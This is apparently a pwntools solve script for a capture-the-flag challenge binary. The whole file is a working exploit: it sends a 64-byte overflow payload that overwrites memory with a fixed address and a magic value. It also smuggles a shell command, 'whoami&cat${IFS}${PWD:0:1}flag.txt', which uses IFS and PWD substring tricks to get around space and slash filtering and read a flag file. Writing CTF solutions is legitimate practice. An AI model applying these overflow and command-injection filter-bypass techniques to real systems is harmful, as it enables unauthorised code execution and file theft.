from pwn import *

binary = '../dist/src/chall'

context.log_level = 'DEBUG'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('127.0.0.1', 61007)

command = b'whoami&cat${IFS}${PWD:0:1}flag.txt'
r.sendline(flat([
    command,
    b'\x00' * (64 - len(command)),
    0x4dd410,
    b'\x00',
    b'\x00' * 3,
    0xd34db33f
]))

r.interactive()
